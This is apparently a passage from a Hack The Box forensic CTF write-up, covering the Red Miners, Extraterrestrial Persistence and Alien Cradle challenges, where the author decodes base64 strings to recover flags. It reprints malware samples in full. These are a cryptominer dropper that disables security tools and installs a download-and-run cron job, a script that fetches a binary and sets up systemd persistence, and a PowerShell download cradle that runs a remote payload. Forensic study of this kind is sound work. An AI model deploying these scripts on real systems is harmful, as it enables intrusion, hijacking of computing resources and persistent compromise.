  ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi|grep -v postgresq1 | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
  systemctl stop c3pool_miner.service
  pkill -f pastebin
  pkill -f ssh-agent
  pgrep -f monerohash | xargs -I % kill -9 %
  pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
  pgrep -f xzpauectgr | xargs -I % kill -9 %
  pgrep -f slxfbkmxtd | xargs -I % kill -9 %
  pgrep -f mixtape | xargs -I % kill -9 %
  pgrep -f addnj | xargs -I % kill -9 %
  pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
  pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
  pgrep -f mqdsflm.cf | xargs -I % kill -9 %
  pgrep -f stratum | xargs -I % kill -9 %
  pgrep -f lower.sh | xargs -I % kill -9 %
  pgrep -f ./ppp | xargs -I % kill -9 %
  pgrep -f cryptonight | xargs -I % kill -9 %
  pgrep -f ./seervceaess | xargs -I % kill -9 %
  pgrep -f ./servceaess | xargs -I % kill -9 %
  pgrep -f ./servceas | xargs -I % kill -9 %
  pgrep -f ./servcesa | xargs -I % kill -9 %
  pgrep -f ./vsp | xargs -I % kill -9 %
  pgrep -f ./jvs | xargs -I % kill -9 %
  pgrep -f ./pvv | xargs -I % kill -9 %
  pgrep -f ./vpp | xargs -I % kill -9 %
  pgrep -f ./pces | xargs -I % kill -9 %
  pgrep -f ./rspce | xargs -I % kill -9 %
  pgrep -f ./haveged | xargs -I % kill -9 %
  pgrep -f ./jiba | xargs -I % kill -9 %
  pgrep -f ./watchbog | xargs -I % kill -9 %
  pgrep -f ./A7mA5gb | xargs -I % kill -9 %
  pgrep -f kacpi_svc | xargs -I % kill -9 %
  pgrep -f kswap_svc | xargs -I % kill -9 %
  pgrep -f kauditd_svc | xargs -I % kill -9 %
  pgrep -f kpsmoused_svc | xargs -I % kill -9 %
  pgrep -f kseriod_svc | xargs -I % kill -9 %
  pgrep -f kthreadd_svc | xargs -I % kill -9 %
  pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
  pgrep -f kintegrityd_svc | xargs -I % kill -9 %
  pgrep -f jawa | xargs -I % kill -9 %
  pgrep -f oracle.jpg | xargs -I % kill -9 %
  pgrep -f servim | xargs -I % kill -9 %
  pgrep -f kblockd_svc | xargs -I % kill -9 %
  pgrep -f native_svc | xargs -I % kill -9 %
  pgrep -f ynn | xargs -I % kill -9 %
  pgrep -f 65ccEJ7 | xargs -I % kill -9 %
  pgrep -f jmxx | xargs -I % kill -9 %
  pgrep -f 2Ne80nA | xargs -I % kill -9 %
  pgrep -f sysstats | xargs -I % kill -9 %
  pgrep -f systemxlv | xargs -I % kill -9 %
  pgrep -f watchbog | xargs -I % kill -9 %
  pgrep -f OIcJi1m | xargs -I % kill -9 %
  pkill -f biosetjenkins
  pkill -f Loopback
  pkill -f apaceha
  pkill -f cryptonight
  pkill -f stratum
  pkill -f mixnerdx
  pkill -f performedl
  pkill -f JnKihGjn
  pkill -f irqba2anc1
  pkill -f irqba5xnc1
  pkill -f irqbnc1
  pkill -f ir29xc1
  pkill -f conns
  pkill -f irqbalance
  pkill -f crypto-pool
  pkill -f XJnRj
  pkill -f mgwsl
  pkill -f pythno
  pkill -f jweri
  pkill -f lx26
  pkill -f NXLAi
  pkill -f BI5zj
  pkill -f askdljlqw
  pkill -f minerd
  pkill -f minergate
  pkill -f Guard.sh
  pkill -f ysaydh
  pkill -f bonns
  pkill -f donns
  pkill -f kxjd
  pkill -f Duck.sh
  pkill -f bonn.sh
  pkill -f conn.sh
  pkill -f kworker34
  pkill -f kw.sh
  pkill -f pro.sh
  pkill -f polkitd
  pkill -f acpid
  pkill -f icb5o
  pkill -f nopxi
  pkill -f irqbalanc1
  pkill -f minerd
  pkill -f i586
  pkill -f gddr
  pkill -f mstxmr
  pkill -f ddg.2011
  pkill -f wnTKYg
  pkill -f deamon
  pkill -f disk_genius
  pkill -f sourplum
  pkill -f polkitd
  pkill -f nanoWatch
  pkill -f zigw
  pkill -f devtool
  pkill -f devtools
  pkill -f systemctI
  pkill -f watchbog
  pkill -f cryptonight
  pkill -f sustes
  pkill -f xmrig
  pkill -f xmrig-cpu
  pkill -f 121.42.151.137
  pkill -f sysguard
  pkill -f networkservice
  pkill -f sysupdate
  pkill -f phpguard
  pkill -f phpupdate
  pkill -f networkmanager
  pkill -f /tmp/init12.cfg
  pkill -f kieuanilam.me
  pkill -f init12.cfg
  pkill -f nginxk
  pkill -f tmp/wc.conf
  pkill -f xmrig-notls
  pkill -f xmr-stak
  pkill -f suppoie
  pkill -f zer0day.ru
  pkill -f dbus-daemon--system
  pkill -f nullcrew
  pkill -f systemctI
  pkill -f kworkerds
  pkill -f init10.cfg
  pkill -f /wl.conf
  pkill -f crond64
  pkill -f sustse
  pkill -f vmlinuz
  pkill -f exin
  pkill -f apachiii
  rm -rf /usr/bin/config.json
  rm -rf /usr/bin/exin
  killall log_rot
  pkill -f log_rot
  rm -rf /tmp/wc.conf
  rm -rf /tmp/log_rot
  rm -rf /tmp/apachiii
  rm -rf /tmp/sustse
  rm -rf /tmp/php
  rm -rf /tmp/p2.conf
  rm -rf /tmp/pprt
  rm -rf /tmp/ppol
  rm -rf /tmp/javax/config.sh
  rm -rf /tmp/javax/sshd2
  rm -rf /tmp/.profile
  rm -rf /tmp/1.so
  rm -rf /tmp/kworkerds
  rm -rf /tmp/kworkerds3
  rm -rf /tmp/kworkerdssx
  rm -rf /tmp/xd.json
  rm -rf /tmp/syslogd
  rm -rf /tmp/syslogdb
  rm -rf /tmp/65ccEJ7
  rm -rf /tmp/jmxx
  rm -rf /tmp/2Ne80nA
  rm -rf /tmp/dl
  rm -rf /tmp/ddg
  rm -rf /tmp/systemxlv
  rm -rf /tmp/systemctI
  rm -rf /tmp/.abc
  rm -rf /tmp/osw.hb
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/.java
  rm -rf /tmp/.omed
  rm -rf /tmp/.tmpc
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/gates.lod
  rm -rf /tmp/conf.n
  rm -rf /tmp/update.sh
  rm -rf /tmp/devtool
  rm -rf /tmp/devtools
  rm -rf /tmp/fs
  rm -rf /tmp/.rod
  rm -rf /tmp/.rod.tgz
  rm -rf /tmp/.rod.tgz.1
  rm -rf /tmp/.rod.tgz.2
  rm -rf /tmp/.mer
  rm -rf /tmp/.mer.tgz
  rm -rf /tmp/.mer.tgz.1
  rm -rf /tmp/.hod
  rm -rf /tmp/.hod.tgz
  rm -rf /tmp/.hod.tgz.1
  rm -rf /tmp/84Onmce
  rm -rf /tmp/C4iLM4L
  rm -rf /tmp/lilpip
  rm -rf /tmp/3lmigMo
  rm -rf /tmp/am8jmBP
  rm -rf /tmp/tmp.txt
  rm -rf /tmp/baby
  rm -rf /tmp/.lib
  rm -rf /tmp/systemd
  rm -rf /tmp/lib.tar.gz
  rm -rf /tmp/baby
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.mynews1234
  rm -rf /tmp/a3e12d
  rm -rf /tmp/.pt
  rm -rf /tmp/.pt.tgz
  rm -rf /tmp/.pt.tgz.1
  rm -rf /tmp/go
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.tmpnewasss
  rm -rf /tmp/java
  rm -rf /tmp/go.sh
  rm -rf /tmp/go2.sh
  rm -rf /tmp/khugepageds
  rm -rf /tmp/.censusqqqqqqqqq
  rm -rf /tmp/.kerberods
  rm -rf /tmp/kerberods
  rm -rf /tmp/seasame
  rm -rf /tmp/touch
  rm -rf /tmp/.p
  rm -rf /tmp/runtime2.sh
  rm -rf /tmp/runtime.sh
  rm -rf /dev/shm/z3.sh
  rm -rf /dev/shm/z2.sh
  rm -rf /dev/shm/.scr
  rm -rf /dev/shm/.kerberods
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  chattr -i /etc/ld.so.preload
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  rm -rf /tmp/watchdogs
  rm -rf /etc/cron.d/tomcat
  rm -rf /etc/rc.d/init.d/watchdogs
  rm -rf /usr/sbin/watchdogs
  rm -f /tmp/kthrotlds
  rm -f /etc/rc.d/init.d/kthrotlds
  rm -rf /tmp/.sysbabyuuuuu12
  rm -rf /tmp/logo9.jpg
  rm -rf /tmp/miner.sh
  rm -rf /tmp/nullcrew
  rm -rf /tmp/proc
  rm -rf /tmp/2.sh
  rm /opt/atlassian/confluence/bin/1.sh
  rm /opt/atlassian/confluence/bin/1.sh.1
  rm /opt/atlassian/confluence/bin/1.sh.2
  rm /opt/atlassian/confluence/bin/1.sh.3
  rm /opt/atlassian/confluence/bin/3.sh
  rm /opt/atlassian/confluence/bin/3.sh.1
  rm /opt/atlassian/confluence/bin/3.sh.2
  rm /opt/atlassian/confluence/bin/3.sh.3
  rm -rf /var/tmp/f41
  rm -rf /var/tmp/2.sh
  rm -rf /var/tmp/config.json
  rm -rf /var/tmp/xmrig
  rm -rf /var/tmp/1.so
  rm -rf /var/tmp/kworkerds3
  rm -rf /var/tmp/kworkerdssx
  rm -rf /var/tmp/kworkerds
  rm -rf /var/tmp/wc.conf
  rm -rf /var/tmp/nadezhda.
  rm -rf /var/tmp/nadezhda.arm
  rm -rf /var/tmp/nadezhda.arm.1
  rm -rf /var/tmp/nadezhda.arm.2
  rm -rf /var/tmp/nadezhda.x86_64
  rm -rf /var/tmp/nadezhda.x86_64.1
  rm -rf /var/tmp/nadezhda.x86_64.2
  rm -rf /var/tmp/sustse3
  rm -rf /var/tmp/sustse
  rm -rf /var/tmp/moneroocean/
  rm -rf /var/tmp/devtool
  rm -rf /var/tmp/devtools
  rm -rf /var/tmp/play.sh
  rm -rf /var/tmp/systemctI
  rm -rf /var/tmp/update.sh
  rm -rf /var/tmp/.java
  rm -rf /var/tmp/1.sh
  rm -rf /var/tmp/conf.n
  rm -r /var/tmp/lib
  rm -r /var/tmp/.lib
  rm -rf /tmp/config.json
  chattr -iau /tmp/lok
  chmod +700 /tmp/lok
  rm -rf /tmp/lok
  #yum install -y docker.io || apt-get install docker.io;
  docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
  docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
  setenforce 0
  echo SELINUX=disabled >/etc/selinux/config
  service apparmor stop
  systemctl disable apparmor
  service aliyun.service stop
  systemctl disable aliyun.service
  ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
  rm -rf /usr/local/aegis


  ROOTUID="0"
  BIN_PATH="/etc"
  if [ "$(id -u)" -ne "$ROOTUID" ] ; then
    BIN_PATH="/tmp"
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH not exists or not writeable"
      mkdir /tmp
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH replacing with /var/tmp"
      BIN_PATH="/var/tmp"
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      TMP_DIR=$(mktemp -d)
      echo "$BIN_PATH replacing with $TMP_DIR"
      BIN_PATH="$TMP_DIR"
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH replacing with /dev/shm"
      BIN_PATH="/dev/shm"
    fi
    if [ -d "$BIN_PATH/$BIN_NAME" ]; then
      echo "$BIN_PATH/$BIN_NAME is directory"
      rm -rf $BIN_PATH/$BIN_NAME
    fi
    if [ -e "$BIN_PATH/$BIN_NAME" ]; then
      echo "$BIN_PATH/$BIN_NAME exists"
      if [ ! -w "$BIN_PATH/$BIN_NAME" ]; then
        echo "$BIN_PATH/$BIN_NAME not writeable"
        ls -la $BIN_PATH | grep -e "/dev" | grep -v grep
        if [ $? -eq 0 ]; then
          rm -rf $BIN_PATH/$BIN_NAME
          rm -rf $BIN_PATH/kdevtmpfsi
          echo "found /dev"
        else
          echo "not found /dev"
        fi
        TMP_BIN_NAME=$(head -3 /dev/urandom | tr -cd '[:alnum:]' | cut -c -8)
        BIN_NAME="xmrig_$TMP_BIN_NAME"
      else
        echo "writeable $BIN_PATH/$BIN_NAME"
      fi
    fi
  fi

  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    echo "$BIN_PATH still not writeable"
    BIN_PATH="/dev/shm"
  fi

  BIN_FULL_PATH="$BIN_PATH/$BIN_NAME"
  echo "$BIN_FULL_PATH"

  LDR="wget -q -O -"
  if [ -s /usr/bin/curl ]; then
    LDR="curl"
  fi
  if [ -s /usr/bin/wget ]; then
    LDR="wget -q -O -"
  fi

  if [ -x "$(command -v curl)" ]; then
    WGET="curl -o"
  elif [ -x "$(command -v wget)" ]; then
    WGET="wget -O"
  else
    echo "wget none"
  fi
  echo "wget is $WGET"

  ls -la $BIN_PATH | grep -e "/dev" | grep -v grep
  if [ $? -eq 0 ]; then
    rm -rf $BIN_FULL_PATH
    rm -rf $SO_FULL_PATH
    rm -rf $BIN_PATH/kdevtmpfsi
    rm -rf $BIN_PATH/libsystem.so
    rm -rf /tmp/kdevtmpfsi
    echo "found /dev"
  else
    echo "not found /dev"
  fi
}

check_if_operation_is_active() {
  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="

  if curl --silent --head --request GET "$url" | grep "200 OK" >/dev/null; then
    echo "Internet is enabled."
  else
    exit 1
  fi
}

cronCleanUp() {
  crontab -l | sed '/base64/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/logo4/d' | crontab -
  crontab -l | sed '/logo9/d' | crontab -
  crontab -l | sed '/logo0/d' | crontab -
  crontab -l | sed '/logo/d' | crontab -
  crontab -l | sed '/tor2web/d' | crontab -
  crontab -l | sed '/jpg/d' | crontab -
  crontab -l | sed '/png/d' | crontab -
  crontab -l | sed '/tmp/d' | crontab -
  crontab -l | sed '/zmreplchkr/d' | crontab -
  crontab -l | sed '/aliyun.one/d' | crontab -
  crontab -l | sed '/pastebin/d' | crontab -
  crontab -l | sed '/onion/d' | crontab -
  crontab -l | sed '/lsd.systemten.org/d' | crontab -
  crontab -l | sed '/shuf/d' | crontab -
  crontab -l | sed '/ash/d' | crontab -
  crontab -l | sed '/mr.sh/d' | crontab -
  crontab -l | sed '/localhost.xyz/d' | crontab -
  crontab -l | sed '/github/d' | crontab -
  crontab -l | sed '/bigd1ck.com/d' | crontab -
  crontab -l | sed '/xmr.ipzse.com/d' | crontab -
  crontab -l | sed '/newdat.sh/d' | crontab -
  crontab -l | sed '/lib.pygensim.com/d' | crontab -
  crontab -l | sed '/t.amynx.com/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/systemd-service.sh/d' | crontab -
  crontab -l | sed '/pg_stat.sh/d' | crontab -
  crontab -l | sed '/sleep/d' | crontab -
  crontab -l | sed '/oka/d' | crontab -
  crontab -l | sed '/linux1213/d' | crontab -
  crontab -l | sed '/zsvc/d' | crontab -
  crontab -l | sed '/_cron/d' | crontab -
  crontab -l | sed '/givemexyz/d' | crontab -
  crontab -l | sed '/world/d' | crontab -
  crontab -l | sed '/1.sh/d' | crontab -
  crontab -l | sed '/3.sh/d' | crontab -
  crontab -l | sed '/workers/d' | crontab -
  crontab -l | sed '/oracleservice/d' | crontab -
}

checkExists() {
  CHECK_PATH=$1
  MD5=$2
  sum=$(md5sum $CHECK_PATH | awk '{ print $1 }')
  retval=""
  if [ "$MD5" = "$sum" ]; then
    echo >&2 "$CHECK_PATH is $MD5"
    retval="true"
  else
    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"
    retval="false"
  fi

  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
  if [[ ! -d $dest ]];
  then
    mkdir -p "$BIN_PATH/$dest"
  fi
  cp $CHECK_PATH $BIN_PATH/$dest
  echo "$retval"
}


download() {
  DOWNLOAD_PATH=$1
  DOWNLOAD_URL=$2
  if [ -L $DOWNLOAD_PATH ]
  then
    rm -rf $DOWNLOAD_PATH
  fi
  chmod 777 $DOWNLOAD_PATH
  $WGET $DOWNLOAD_PATH $DOWNLOAD_URL
  chmod +x $DOWNLOAD_PATH
}

checkTarget
check_if_operation_is_active

echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc

Sleep 1000
binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
if [ "$binExists" = "true" ]; then
  echo "$BIN_FULL_PATH exists and checked"
else
  echo "$BIN_FULL_PATH not exists"
  download $BIN_FULL_PATH $BIN_DOWNLOAD_URL
  binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
  if [ "$binExists" = "true" ]; then
    echo "$BIN_FULL_PATH after download exists and checked"
  else
    echo "$BIN_FULL_PATH after download not exists"
    download $BIN_FULL_PATH $BIN_DOWNLOAD_URL2
    binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
    if [ "$binExists" = "true" ]; then
      echo "$BIN_FULL_PATH after download2 exists and checked"
    else
      echo "$BIN_FULL_PATH after download2 not exists"
    fi
  fi
fi

chmod 777 $BIN_FULL_PATH
chmod +x $BIN_FULL_PATH
SKL=ex $BIN_FULL_PATH

crontab -l | sed '/#wget/d' | crontab -
crontab -l | sed '/#curl/d' | crontab -
crontab -l | grep -e "tossacoin.htb" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
  ) | crontab -
fil3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d
part1="HTB{m1n1ng"
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d
export part4="_th3_r3d_pl4n3t}"l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$


l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d
export part4="_th3_r3d_pl4n3t}"l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d                          echo "cGFydDI9Il90aDMxcl93NHkiCg=="|base64 -d
part2="_th31r_w4y"
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$

l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo "X3QwX200cnN9Cg=="|base64 -d
_t0_m4rs}
```

flag: `HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}`

## Extraterrestrial Persistence

```
 cat .\persistence.sh
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```

```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Red Miners$ echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

flag: `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`


## Alien Cradle

```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Alien Cradle$ cat cradle.ps1
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

